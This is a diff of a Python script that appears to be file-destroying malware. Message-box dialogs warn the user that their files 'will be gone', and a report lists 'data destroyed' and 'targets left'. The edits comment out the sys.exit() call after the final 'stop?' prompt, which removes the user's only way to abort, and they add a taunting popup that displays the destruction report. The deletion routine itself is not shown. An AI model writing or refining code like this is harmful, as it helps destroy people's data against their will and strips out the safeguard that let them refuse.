@@ -49,7 +49,7 @@ for que, rep in warns.items():
 	inn = mb.askyesno(random.choice(titles), que)
 
 	if inn != rep:
-		mb.showinfo('good choice!', 'your files are safe for now')
+		mb.showinfo('good choice!', 'your files will be safe for now')
 		#sys.exit()
 
 mb.showwarning('last warning', 'all your files in\n"{}"\nwill be gone'.format(loc))
@@ -57,8 +57,8 @@ mb.showwarning('last warning', 'all your files in\n"{}"\nwill be gone'.format(lo
 inn = mb.askyesno('last try, stop?', 'you won\'t get another chance')
 
 if inn != no:
-	mb.showinfo('good choice!', 'your files are safe for now')
-	sys.exit()
+	mb.showinfo('good choice!', 'your files will be safe for now')
+	#sys.exit()
 
 mb.showinfo('that\'s it, you\'ve done it', 'congrats you\'ve reached the no return point,\ni will make you and your files suffer now,\nunless...')
 
@@ -74,10 +74,6 @@ if fireInTheHole:
 
 #end
 print ('\n\n')
-print ('{:=^60}'.format(' report start '))
-print ('operation status: {}'.format(opStat))
-print ('agent stats after the operation:\n{}'.format(killer))
-print ('data destroyed in operation: {}'.format(killer.kills))
-print ('targets left: {}'.format(len(killer.Files) + len(killer.Folders)))
-print ('{:=^60}'.format(' report end '))
-print ('\nthats it, have a bad day!')
+opReport = '{:=^60}'.format(' report start ') + '\noperation status: {}'.format(opStat) + '\nagent stats after the operation:\n{}'.format(killer) + '\ndata destroyed in operation: {}'.format(killer.kills) + '\ntargets left: {}'.format(len(killer.Files) + len(killer.Folders)) + '\n{:=^60}'.format(' report end ')
+
+mb.showinfo('thats it, have a bad day!', opReport)
